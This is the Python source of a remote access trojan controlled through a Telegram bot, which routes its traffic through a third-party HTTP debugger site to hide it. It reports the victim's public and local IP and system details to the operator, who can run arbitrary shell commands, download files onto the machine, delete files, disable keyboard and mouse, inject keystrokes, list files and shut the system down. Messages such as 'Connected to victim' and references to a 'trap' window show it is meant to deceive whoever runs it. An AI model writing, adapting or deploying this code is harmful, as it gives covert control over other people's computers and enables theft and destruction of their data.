import requests
from os import chdir, getcwd, remove, startfile
from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
cwd = getcwd()
def check_internret():
    try:
        requests.get("https://www.google.com/")
        return True
    except: 
        return False
if check_internret():
    import json, wget, webbrowser
    from bs4 import BeautifulSoup
    from platform import uname
    from subprocess import getoutput, Popen
    from time import tzname, sleep, strftime
    from getpass import getuser
    from Its_Hub import Its_Hub
    from pyautogui import write, hotkey
    Hub = Its_Hub()
    os = Hub.OS()
    mouse = Hub.Mouse()
    keyboard = Hub.Keyboard()
    ip = requests.get("https://api.ipify.org/").text
    local_ip = os.Get_IP()
    token = BOT_TOKEN 
    id = TELEGRAM_ID
    commands = ["/check", 
                "/sysinfo", 
                "/open_site", 
                "/stop", 
                "/pass", 
                "/shutdown", 
                "/shell", 
                "/download",
                "/check_exist",
                "/whereami",
                "/mkdir",
                "/rm",
                "/create_file",
                "/show_error",
                "/show_info",
                "/show_warning",
                "/voice",
                "/dis_all",
                "/chdir",
                "/localhost", 
                "/open_app", 
                "/write_word", 
                "/hotkey",
                "/press_enter",
                "/alt_f4",
                "/find_all",
                "/ip_info"]
    def send_msg(message, token=token, id=id):
        try:
            url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
            if RATg.status_code == 200: return True
            else: return False
        except: return False
    def read_msg(token=token):
        try:
            url = f"https://api.telegram.org/bot{token}/GetUpdates"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data).content.decode()
            soup = BeautifulSoup(source, "html.parser")
            find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
            return find_tag["result"][-1]["message"]["text"]
        except: return False
    def start():
        global cwd
        while True:
            try:
                command = read_msg()
                if command == "/pass": pass
                else:
                    if command == "/check": send_msg("This is check message")
                    if command == "/sysinfo":
                        try:
                            u = uname()
                            info = f""" SYSINFO:    
    IP: {ip}
    Local IP: {local_ip}
    System: {u[0]}
    System Version: {u[2]}
    Node: {u[1]}
    Machine: {u[4]}
    Time Zone: {tzname[0]}
    User: {getuser()}"""
                            send_msg(info)
                        except: send_msg("Error;")
                    if command == "/open_site":
                        try:
                            send_msg("write website URL(10 seconds):")
                            sleep(10)
                            data = read_msg()
                            webbrowser.open_new_tab(data)
                            send_msg(f"{data} is complete opened.")
                        except: send_msg("Error;")
                    if command == "/stop":
                        try:
                            send_msg("When you stop this. you cant connect again. if you are sure send Y if not send N(in 10 seconds): ")
                            sleep(10)
                            text = read_msg()
                            if text == "Y" or text == "y": 
                                send_msg(f"Tunnel is closed at {strftime("%H : %M : %S")}.")
                                exit()
                            else: 
                                send_msg("Task is closed. Dont worry.")
                        except: send_msg("Error;")
                    if command == "/shutdown": 
                        try:
                            send_msg("System is turned off")
                            getoutput("shutdown now")
                            send_msg("Its turned off complete")
                        except: send_msg("Error;")
                    if command == "/shell":
                        try:
                            send_msg("write cmd command(10 seconds):")
                            sleep(10)
                            data = read_msg()
                            out = getoutput(data)
                            send_msg("This is the response:\n" + out)
                        except: send_msg("Error;")
                    if command == "/download":
                        try:
                            send_msg("write file url(in 10 seconds):")
                            sleep(10)
                            url = read_msg()
                            send_msg("write path to install(in 10 seconds):")
                            sleep(10)
                            path = read_msg()
                            if path != url: wget.download(url, out=path)
                            else: wget.download(url)
                            send_msg("File is downloaded.")
                        except: send_msg("Error;")
                    if command == "/check_exist":
                        try:
                            send_msg("write your file address(in 8 seconds):")
                            sleep(8)
                            addr = read_msg()
                            send_msg("write your file name(in 8 seconds): ")
                            sleep(8)
                            file = read_msg()
                            if file != addr: state = os.Check_exist(addr, file)
                            else: os.Check_exist(File_name=file)
                            send_msg(f"This is the response:\n{state}")
                        except: send_msg("Error;")
                    if command == "/commands": 
                        commands_txt = """"""
                        for i in range(len(commands)):
                            commands_txt += f"{i+1}. {commands[i]}\n"
                        send_msg(commands_txt)
                    if command == "/whereami": 
                        try: send_msg(os.Get_code_address())
                        except: send_msg("Error;")
                    if command == "/mkdir":
                        try:
                            send_msg("write directory name(in 10 seconds):")
                            sleep(10)
                            name = read_msg()
                            os.Create_directory(name)
                            send_msg(f"{name} Directory is created.")
                        except: send_msg("Error;")
                    if command == "/rm": 
                        try:
                            send_msg("write file name(in 10 seconds):")
                            sleep(10)
                            file = read_msg()
                            send_msg("write file address(in 10 seconds):")
                            sleep(10)
                            addr = read_msg()
                            if file != addr: 
                                remove(addr+file)
                                send_msg(f"{addr+file} is removed.")
                            else: 
                                remove(file)
                                send_msg(f"{file} is removed.")
                        except: send_msg("Error;")
                    if command == "/create_file":
                        try:
                            send_msg("write your file name(in 10 seconds):")
                            sleep(10)
                            name = read_msg()
                            send_msg("write your file text(in 10 seconds):")
                            sleep(10)
                            text = read_msg()
                            with open(name, "w") as writer: writer.write(text)
                            send_msg(f"{name} is created.")
                        except: send_msg("Error;")
                    if command == "/show_error": 
                        try:
                            send_msg("write the title of error message(in 10 seconds):")
                            sleep(10)
                            title = read_msg()
                            send_msg("write the text of error message(in 10 seconds):")
                            sleep(10)
                            text = read_msg()
                            messagebox.showerror(title, text)
                        except: send_msg("Error;")
                    if command == "/show_info": 
                        try:
                            send_msg("write the title of info message(in 10 seconds):")
                            sleep(10)
                            title = read_msg()
                            send_msg("write the text of info message(in 10 seconds):")
                            sleep(10)
                            text = read_msg()
                            messagebox.showinfo(title, text)
                        except: send_msg("Error;")
                    if command == "/show_warning": 
                        try:
                            send_msg("write the title of warning message(in 10 seconds):")
                            sleep(10)
                            title = read_msg()
                            send_msg("write the text of warning message(in 10 seconds):")
                            sleep(10)
                            text = read_msg()
                            messagebox.showwarning(title, text)
                        except: send_msg("Error;")
                    if command == "/voice":
                        try:
                            send_msg("write your text(in 10 seconds):")
                            sleep(10)
                            text = read_msg()
                            voice = Hub.Voice(text)
                            voice.Say()
                        except: send_msg("Error;")
                    if command == "/dis_all":
                        try:
                            keyboard.Disable_keyboard()
                            mouse.Disable_mouse()
                            send_msg("how many seconds disable(write number in 8 seconds)?")
                            sleep(8)
                            try:
                                num = int(read_msg())
                            except: 
                                send_msg("Invalid Input.")
                                break
                            sleep(num)
                            keyboard.Enable_keyboard()
                            mouse.Enable_mouse()
                            send_msg("Mouse and Keyboard is disabled.")
                        except: send_msg("Error;")
                    if command == "/chdir":
                        try:
                            send_msg("write the address you want to go(in 10 seconds):")
                            sleep(10)
                            addr = read_msg()
                            chdir(addr)
                            send_msg(f"address changed to {addr}")
                        except: send_msg("Error;")
                    if command == "/localhost":
                        try:
                            send_msg("write your port(in 8 seconds):")
                            sleep(8)
                            port = read_msg()
                            Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
                            send_msg(f"Localhost is started at: http://{local_ip}:{port}")
                        except: send_msg("Error;")
                    if command == "/open_app":
                        try:
                            send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
                            sleep(10)
                            name = read_msg()
                            try:
                                startfile(name)
                                send_msg(f"{name} application is opened.")
                            except FileNotFoundError:
                                send_msg("File not found.")
                        except: send_msg("Error;")
                    if command == "/write_word":
                        try:
                            send_msg("write your text(in 5 seconds):")
                            sleep(5)
                            text = read_msg()
                            write(text)
                            send_msg(f"{text} is writed")
                        except: send_msg("Error;")
                    if command == "/hotkey":
                        try:
                            send_msg("write your hotkeys(in 10 seconds || split with space):")
                            sleep(10)
                            all_key = str(read_msg()).split(" ")
                            len_key = len(all_key)
                            if len_key == 1 and len_key != 0: hotkey(all_key[0])
                            else: hotkey(all_key[0], all_key[1])
                        except: send_msg("Error;")
                    if command == "/press_enter":
                        try: hotkey("enter")
                        except: send_msg("Error;")
                    if command == "/alt_f4":
                        try: hotkey("alt", "f4")
                        except: send_msg("Error;")
                    if command == "/find_all":
                        try:
                            send_msg("write limit of find(in 5 seconds):")
                            sleep(5)
                            limit = int(read_msg())
                            send_msg("write file format(in 5 seconds): ")
                            sleep(5)
                            form = read_msg()
                            all_files = getoutput(f'find -name "*.{form}" -type f')
                            all_files = all_files.split("\n")
                            out = """"""
                            for i in range(len(all_files)):
                                if i + 1 == limit: break
                                else:
                                    out += f"{i+1}. {all_files[i]}\n"
                            send_msg(out)
                        except: send_msg("Error;")
                    if command == "/ip_info":
                        try:
                            out = getoutput("ip addr show")
                            send_msg(out)
                        except: send_msg("Error;")
                    send_msg("click /pass")
                    sleep(5)
            except: 
                send_msg("start() function error. try again...")
                continue
    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. Whene trap close I will notif you.")
TK_CODE
    send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
    start()
else:
OFFLINE_TKINTER_CODE